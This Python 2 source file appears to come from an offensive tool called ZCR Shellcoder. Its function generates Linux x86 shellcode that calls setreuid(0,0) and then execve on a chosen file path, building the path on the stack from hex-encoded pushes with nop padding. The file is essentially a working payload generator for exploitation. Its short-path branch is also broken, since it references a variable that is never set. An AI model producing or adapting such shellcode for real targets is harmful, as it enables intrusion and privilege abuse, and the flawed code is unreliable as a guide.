#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
import binascii
def run(file_to_exec):
	m = len(file_to_exec) - 1
	
	
	if len(file_to_exec) >= 4:
		m = len(file_to_exec) - 1
		stack = ''
		while(m>=0):
				stack += file_to_exec[m]
				m -= 1
		stack = stack.encode('hex')
		shr_counter = 0 
		shr_counter = len(stack) % 8
		zshr_counter = shr_counter
		shr = None
		if shr_counter is 2:
			shr = '\npop %eax\nshr    $0x10,%eax\nshr    $0x8,%eax\npush %eax\n'
			stack = stack[0:2] + '909090' + stack[2:]
		if shr_counter is 4:
			shr = '\npop %eax\nshr    $0x10,%eax\npush %eax\n'
			stack = stack[0:4] + '9090' + stack[4:]
		if shr_counter is 6:
			shr = '\npop %eax\nshr    $0x8,%eax\npush %eax\n'
			stack = stack[0:6] + '90' + stack[6:]
		zshr = shr
		m = len(stack)
		n = len(stack) / 8
		file_shellcode = ''
		shr_counter = len(stack) % 8
		if shr_counter is 0:
			shr_n = 0
			r = ''
			while(n is not 0):
				if shr is not None:
					shr_n += 1
					zx = m - 8
					file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
					m -= 8
					n = n - 1
					shr = None
				if shr is None:
					shr_n += 1
					zx = m - 8
					file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
					m -= 8
					n = n - 1
					
					
			if zshr is None:
				file_z = file_shellcode
			if zshr is not None:
				rep1 = file_shellcode[:16]
				rep2 = rep1 + zshr
				file_z = file_shellcode.replace(rep1,rep2)
			content = file_z
	if len(file_to_exec) <= 3:
		content = '0x' + binascii.b2a_hex(file_to_exec)
		if len(content) % 2 is not 0:
			content = content.replace('0x','0x0')
		if len(content) is 10:
			content = content + '\npop %eax\n'
		if len(content) is 8:
			content = content + '90\npop %eax\nshr $0x8,%eax\n'
		if len(content) is 6:
			content = content + '9090\npop %eax\nshr $0x10,%eax\n'
		if len(content) is 4:
			content = content + '909090\npop %eax\nshr $0x10,%eax\nshr $0x8,%eax\n'
		content = 'push $' + content
	
	
	shellcode = '''
mov    $0x46,%%al
xor    %%ebx,%%ebx
xor    %%ecx,%%ecx
int    $0x80

%s


mov    %%esp,%%ebx
xor    %%eax,%%eax
mov    %%al,0x7(%%ebx)
mov    %%ebx,0x8(%%ebx)
mov    %%eax,0xc(%%ebx)
mov    $0xb,%%al
lea    0x8(%%ebx),%%ecx
lea    0xc(%%ebx),%%edx
int    $0x80



mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(file_z)
	return shellcode

	
